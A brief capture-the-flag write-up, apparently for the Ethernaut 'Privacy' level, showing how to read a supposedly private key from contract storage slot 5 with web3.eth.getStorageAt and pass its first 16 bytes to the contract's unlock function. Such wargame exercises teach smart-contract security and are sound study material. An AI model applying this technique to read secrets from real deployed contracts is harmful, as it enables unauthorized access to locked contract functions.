* Storage Layout in our case :
 * bool
 * all the uint variables
 * then our array of bytes

* As we need the data[2] of an array of size 3, + what is written above, it means we want the storage in fifth position.
 * `await web3.eth.getStorageAt('0x3C44fdf842140FD7bFb5783d4B073b087e83D10f',5);`
 * Gives this result `'0x50b12d0329ba62d11d3a8da2f61f658c854b3501d00b1d9b6177e41c3e40c671'`
 * Then the unlock function asks for bytes16, then, we need to give the 0x + 32 caracters of the 64 caracters get with the instruction.
 * Then : `await contract.unlock('0x50b12d0329ba62d11d3a8da2f61f658c');`

For more help consider looking these explaination :
* https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html
* https://dev.to/nvn/ethernaut-hacks-level-12-privacy-2afl
